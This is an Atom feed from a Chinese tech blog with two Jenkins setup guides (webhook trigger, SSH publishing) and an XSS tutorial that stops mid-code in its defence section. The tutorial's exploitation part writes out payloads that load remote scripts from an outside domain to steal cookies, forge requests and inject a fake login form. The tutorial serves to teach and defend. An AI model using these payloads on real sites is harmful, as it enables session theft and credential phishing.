<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>游魂的网络日志</title>
  
  <subtitle>分享技术，记录点滴</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="//www.shen.ee/"/>
  <updated>2022-06-22T06:24:25.993Z</updated>
  <id>//www.shen.ee/</id>
  
  <author>
    <name>Andy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jenkins Generic Webhook Trigger 插件使用</title>
    <link href="//www.shen.ee/article/27057.html"/>
    <id>//www.shen.ee/article/27057.html</id>
    <published>2022-06-22T03:01:39.000Z</published>
    <updated>2022-06-22T06:24:25.993Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Coding项目-Webhook-设置"><a href="#Coding项目-Webhook-设置" class="headerlink" title="Coding项目 Webhook 设置"></a>Coding项目 Webhook 设置</h4><p>1.进入项目设置 =&gt; 开发者选项 =&gt; Service Hook =&gt; 新建Service Hook</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-102931@2x.png" alt=""></p><p>2.根据你的项目选择不同的事件触发类型及过滤条件</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-103147@2x.png" alt=""></p><p>3.配置发送方式</p><p><strong>执行动作</strong>：默认就行</p><p><strong>服务URL</strong>：就是你的<code>generic-webhook-trigger</code>调用地址，<a href="http://JENKINS_URL/generic-webhook-trigger/invoke" target="_blank" rel="noopener">http://JENKINS_URL/generic-webhook-trigger/invoke</a></p><p>例如：<a href="http://108.108.108.108:8080/generic-webhook-trigger/invoke" target="_blank" rel="noopener">http://108.108.108.108:8080/generic-webhook-trigger/invoke</a></p><p><strong>构建 Token</strong>：自定义即可，下面项目发布设置会用到</p><p>其他不必填的根据自己实际需求填写</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-105206@2x.png" alt=""></p><h4 id="项目发布设置"><a href="#项目发布设置" class="headerlink" title="项目发布设置"></a>项目发布设置</h4><p>1.点击 Jenkins项目的构建环境</p><p>2.选择 <code>Generic Webhook Trigger</code></p><p><img src="https://oss.iyouhun.com/img/QQ20211110-101342@2x.png" alt=""></p><p>3.输入对应 token 保存</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-101342@2x.png" alt=""></p><ol><li>push 一下，成功自动构建</li></ol><p><img src="https://oss.iyouhun.com/img/QQ20211110-102341@2x.png" alt=""></p><p><img src="https://oss.iyouhun.com/img/QQ20211110-102456@2x.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Coding项目-Webhook-设置&quot;&gt;&lt;a href=&quot;#Coding项目-Webhook-设置&quot; class=&quot;headerlink&quot; title=&quot;Coding项目 Webhook 设置&quot;&gt;&lt;/a&gt;Coding项目 Webhook 设置&lt;/h4&gt;&lt;p&gt;1.
      
    
    </summary>
    
      <category term="工具" scheme="//www.shen.ee/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Jenkins" scheme="//www.shen.ee/tags/Jenkins/"/>
    
      <category term="Generic Webhook Trigger" scheme="//www.shen.ee/tags/Generic-Webhook-Trigger/"/>
    
      <category term="jenkins插件" scheme="//www.shen.ee/tags/jenkins%E6%8F%92%E4%BB%B6/"/>
    
      <category term="coding插件" scheme="//www.shen.ee/tags/coding%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins Publish over SSH 插件配置及服务器互信</title>
    <link href="//www.shen.ee/article/29773.html"/>
    <id>//www.shen.ee/article/29773.html</id>
    <published>2022-06-22T02:53:39.000Z</published>
    <updated>2022-06-22T06:24:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="服务器互信"><a href="#服务器互信" class="headerlink" title="服务器互信"></a>服务器互信</h3><blockquote><p>A服务器：Jenkins 所在服务器</p><p>B 服务器：项目部署所在服务器</p></blockquote><p>A 服务器生成秘钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"><span class="meta">#</span><span class="bash"> 一路回车</span></span><br></pre></td></tr></table></figure><p>A 服务器 将本地的ssh公钥文件安装到远程主机对应的账户下 （也可以手动复制，推荐命令）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 执行命令后输入密码完成复制</span></span><br><span class="line">ssh-copy-id root@B服务器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">端口不一致复制方法</span></span><br><span class="line">ssh-copy-id -i /root/.ssh/id_rsa.pub "-p 1008 root@B服务器IP"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用该命令测试</span></span><br><span class="line">ssh root@B服务器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 登录后注意此时主机名已经是 B 服务器的了 查看命令</span></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改主机名 centos6</span></span><br><span class="line">vim /etc/sysconfig/network  #编辑network文件修改hostname行（重启生效）</span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查修改</span></span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改主机名 centos7</span></span><br><span class="line">hostnamectl set-hostname www.iyouhun.com # 使用这个命令会立即生效且重启也生效</span><br></pre></td></tr></table></figure><p>复制后的文件在 <code>home/用户名/.ssh/</code>文件下名为 <code>authorized_keys</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 比如 新建了一个 Jenkins账户</span></span><br><span class="line">cat /home/jenkins/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> root 账户在</span></span><br><span class="line">cat /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><h3 id="Publish-over-SSH-插件配置"><a href="#Publish-over-SSH-插件配置" class="headerlink" title="Publish over SSH 插件配置"></a>Publish over SSH 插件配置</h3><p><strong>Passphrase</strong>：  如果生成秘钥的时候输入了密码，就在这里输入，否则留空</p><p><strong>Path to Key</strong>： Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路径，和下面的<strong>Key</strong>二选一</p><p><strong>Key</strong>：  Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路内容，和上面的<strong>Path to Key</strong>二选一</p><p><strong>Disable exec</strong>： 禁用命令执行，删除从此插件执行命令的能力</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-152627@2x.png" alt=""></p><h4 id="SSH-Servers"><a href="#SSH-Servers" class="headerlink" title="SSH Servers"></a>SSH Servers</h4><p><strong>Name</strong>：  名称，标识，自定义即可，仅用作识别</p><p><strong>Host name</strong>： 主机名，服务器的主机名或 IP 地址，这里填写B服务器的 IP地址</p><p><strong>Username</strong>：  将用于连接到主机的用户，比如 <code>root</code></p><p><strong>Remote directory</strong>： 远程服务器上的一个目录，将用作此配置的有效根目录，比如<code>/www/wwwroot</code></p><p><strong>高级选项</strong></p><p>Use password authentication, or use a different key 可以勾选使用密码连接或者秘钥连接</p><p><strong>Passphrase / Password</strong>：秘钥密码或者用户名密码</p><p><strong>Path to Key</strong>： Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路径，和下面的<strong>Key</strong>二选一 </p><p><strong>Key</strong>：  Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路内容，和上面的<strong>Path to Key</strong>二选一</p><p><strong>如果用秘钥链接记住这里是Jenkins(A 服务器)的私钥(<code>id_rsa</code>)</strong></p><p><strong>Port</strong>：远程服务器端口，如果修改了端口，这里记得也改一下</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-160114@2x.png" alt=""></p><p>更多参考：<a href="https://wiki.jenkins.io/display/JENKINS/Publish+Over#PublishOver-host" target="_blank" rel="noopener">https://wiki.jenkins.io/display/JENKINS/Publish+Over#PublishOver-host</a></p><h4 id="项目发布设置"><a href="#项目发布设置" class="headerlink" title="项目发布设置"></a>项目发布设置</h4><p>1.点击 Jenkins项目的构建环境</p><p>2.根据项目情况选择以下两项</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-162258@2x.png" alt=""></p><p>3.选择刚刚添加的发布服务器</p><p>4.传输设置</p><p><strong>Source files</strong>：源文件，支持全部匹配，如果要传输文件夹内所有文件和文件夹则需要在文件夹路径后加两个*符号 <a href="http://ant.apache.org/manual/dirtasks.html#patterns" target="_blank" rel="noopener">模式文档</a></p><p><strong>Remove prefix</strong>：移除前缀，是指源文件的前缀，比如现在我们只是传输html文件夹里的所有文件，但是html文件夹本身不需要在远程服务器出现，那么就需要将其移除.</p><p><strong>Remote directory</strong>： 远程服务器目录，注意该目录是相对于刚刚系统设置里<code>ssh servers</code>里设置的路径，没有会创建</p><p>那么我的此次的目录就是<code>/www/wwwroot/www.iyouhun.com</code></p><p><strong>exec command</strong>：在传输完成后执行的命令，一般为清理文件、复制文件、重启一些服务等等</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-160529@2x.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;服务器互信&quot;&gt;&lt;a href=&quot;#服务器互信&quot; class=&quot;headerlink&quot; title=&quot;服务器互信&quot;&gt;&lt;/a&gt;服务器互信&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;A服务器：Jenkins 所在服务器&lt;/p&gt;
&lt;p&gt;B 服务器：项目部署所在服务器&lt;/p&gt;
      
    
    </summary>
    
      <category term="工具" scheme="//www.shen.ee/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Jenkins" scheme="//www.shen.ee/tags/Jenkins/"/>
    
      <category term="Publish over SSH" scheme="//www.shen.ee/tags/Publish-over-SSH/"/>
    
      <category term="ssh服务器互信" scheme="//www.shen.ee/tags/ssh%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%92%E4%BF%A1/"/>
    
      <category term="服务器互信" scheme="//www.shen.ee/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%92%E4%BF%A1/"/>
    
      <category term="jenkins上传远程服务器" scheme="//www.shen.ee/tags/jenkins%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
      <category term="jenkins远程服务器配置" scheme="//www.shen.ee/tags/jenkins%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击原理分析与防御</title>
    <link href="//www.shen.ee/article/58122.html"/>
    <id>//www.shen.ee/article/58122.html</id>
    <published>2022-06-17T03:05:39.000Z</published>
    <updated>2022-06-22T06:24:26.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p><strong>XSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶意的脚本，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</strong></p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./test.php"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">    您的姓名</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> &gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/md/image-20220615171210880.png" alt="image-20220615171210880"></p><p>输入一段脚本代码提交，会直接弹出</p><p><img src="https://oss.iyouhun.com/img/md/image-20220615165247780.png" alt="image-20220615165247780"></p><p>我们看一下源代码，script脚本被加载到页面中，这显然是有问题的.</p><p><img src="https://oss.iyouhun.com/img/md/image-20220615171427021.png" alt="image-20220615171427021"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型xss会把用户输入的数据存储在服务器端，这种xss具备很强的稳定性，常见的场景就是，黑客写下一篇包含恶意js脚本的博客，其他用户浏览包含恶意js脚本的博客，会在他们浏览器上执行这段恶意代码。包含恶意js脚本的博客是保存在服务端的，所以这种xss攻击叫做“存储型xss”</p><p><strong>正常输入</strong></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173719232.png" alt="image-20220615173719232"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173747621.png" alt="image-20220615173747621"></p><p><strong>非人类输入</strong></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173832904.png" alt="image-20220615173832904"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173849667.png" alt="image-20220615173849667"></p><h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>传统类型的XSS漏洞（反射型或存储型）一般出现在服务器端代码中，而DOM XSS是基于DOM文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).value</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"t"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"' &gt;testLink&lt;/a&gt;"</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击wirte会有一个超链接，其地址为文本框的内容。</p><p>这里的wirte按钮的onclick事件调用了test()函数。而在test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作html写入到页面中，这就造成了DOM based XSS。</p><p>我们构造一个恶意数据：<code>&#39; onclick=&quot;alert(1)&quot;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615175201085.png" alt="image-20220615175201085"></p><p>也可以选择闭合掉标签，并插入一个新的HTML标签</p><p><code>&#39;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#39;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615175708141.png" alt="image-20220615175708141"></p><h2 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h2><h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>常见的XSS漏洞利用方式有Cookie劫持，一般Cookie中保存了用户的登录凭证。如果Cookie泄露，则可以直接登录进用户的账号。</p><ul><li>1.用户登录</li><li>2.攻击者欺骗用户访问带XSS payload的URL</li><li>3.用户请求攻击者的URL</li><li>4.在用户浏览器执行远程js，将cookie发送给攻击者</li><li>5.攻击者利用cookie进入用户账号</li></ul><p>我们可以在最初的反射型例子中输入一段包含远程脚本的代码<code>&lt;script src=&quot;https://liuliang.tk/getcookie.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220616102705682.png" alt="image-20220616102705682"></p><p>看下远程服务器响应日志</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616102741200.png" alt="image-20220616102741200"></p><h3 id="构造GET与POST请求"><a href="#构造GET与POST请求" class="headerlink" title="构造GET与POST请求"></a>构造GET与POST请求</h3><p>通过js，让浏览器发起GET、POST请求，完成各种操作。</p><ul><li>构造GET请求：通过插入图片，图片的src为GET请求的URL。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">const</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>)</span><br><span class="line">img.src = <span class="string">'https://liuliang.tk/option.php?option=add'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img)</span><br></pre></td></tr></table></figure><ul><li><p>构造POST请求：</p><ul><li><p>1.构造form表单，并提交</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">const</span> dd = <span class="built_in">document</span>.createElement (<span class="string">"div"</span>)</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(dd)</span><br><span class="line">dd.innerHTML = <span class="string">"&lt;form action='option.php' method='post' id='xssform'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;input type='text' name='option' value='add'&gt; &lt;/form&gt;"</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"xssform"</span>).submit()</span><br></pre></td></tr></table></figure></li><li><p>2.使用 ajax 请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">let</span> ajax = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'https://liuliang.tk/option.php'</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXobject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveX0bject (<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">"not compatible"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.open(<span class="string">"post"</span>, url, <span class="literal">true</span>)</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">ajax.send(<span class="string">'option=add'</span>)</span><br><span class="line"></span><br><span class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.redyState == <span class="number">4</span> &amp;&amp; ajax.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(<span class="string">"Done"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>访问<code>https://liuliang.tk/option.php?xss=&lt;script src=&quot;https://liuliang.tk/option.js&quot;&gt;&lt;/script&gt;</code></p><p><code>option.txt</code>中写入结果</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616115727331.png" alt="image-20220616115727331"></p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>伪装一个页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>)</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(dd)</span><br><span class="line">dd.innerHTML = <span class="string">"&lt;meta charset='UTF-8'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;form action='login.php' method='post'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;label&gt;用户名:&lt;/label&gt;"</span> + <span class="string">"&lt;input type='text' name='username'&gt;&lt;/li&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;label&gt;密码:&lt;/label&gt;"</span> + <span class="string">"&lt;input type= 'password' name='password'&gt;&lt;/li&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;input type='submit' name='login' value='登录'&gt;&lt;/li&gt;&lt;/form&gt;"</span></span><br></pre></td></tr></table></figure><p>注入 xss <code>https://liuliang.tk/login.php?param=&lt;script src=&quot;https://liuliang.tk/login.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220616135039587.png" alt="image-20220616135039587"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220616135237632.png" alt="image-20220616135237632"></p><h3 id="识别浏览器及插件"><a href="#识别浏览器及插件" class="headerlink" title="识别浏览器及插件"></a>识别浏览器及插件</h3><p>信息收集用户的浏览器版本信息，扩大攻击面。通过js读取浏览器的userAgent对象识别浏览器版本，查询navigator.plugins对象获取插件信息。</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616135613416.png" alt="image-20220616135613416"></p><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p><strong>一个cookie的使用过程如下：</strong></p><p><strong>step1: 浏览器向服务器发起请求，这时候没有cookie。</strong></p><p><strong>step2 : 服务器返回时发送set-cookie，向客户端浏览器写入cookie。</strong></p><p><strong>step3: 在该cookie到前期，浏览器访问该域下的所有界面，都将发送该cookie。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Set-Cookie: Cookie1=test1;&quot;);</span><br><span class="line">    header(&quot;Set-Cookie: Cookie2=test2;httponly&quot;, false);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(document.cookie)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>只有<code>test1</code>被读取到</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616141250020.png" alt="image-20220616141250020"></p><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>对传入参数进行格式校验，并对特殊字符进行过滤或转义。由于输入数据的使用场景不同，过滤或转义可能会影响实际的业务使用。同时XSS攻击发生的位置并不是参数传入的位置，可能存在遗漏。</p><p>输入检查的代码一定要在服务器端实现，因为如果在客户端使用JavaScript进行输入检查，很容易绕过检查。正常做法是客户端和服务端实现相同的输入检查，客户端可以阻挡大部分错误操作的正常用户，可以节约服务器的资源。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">"&amp;amp;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">"&amp;lt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/"/g</span>, <span class="string">"&amp;quot;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/'/g</span>, <span class="string">"&amp;#39;"</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>对返回给浏览器的输出结果进行HTML实体化编码。对JavaScript输出的用户可控数据进行转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 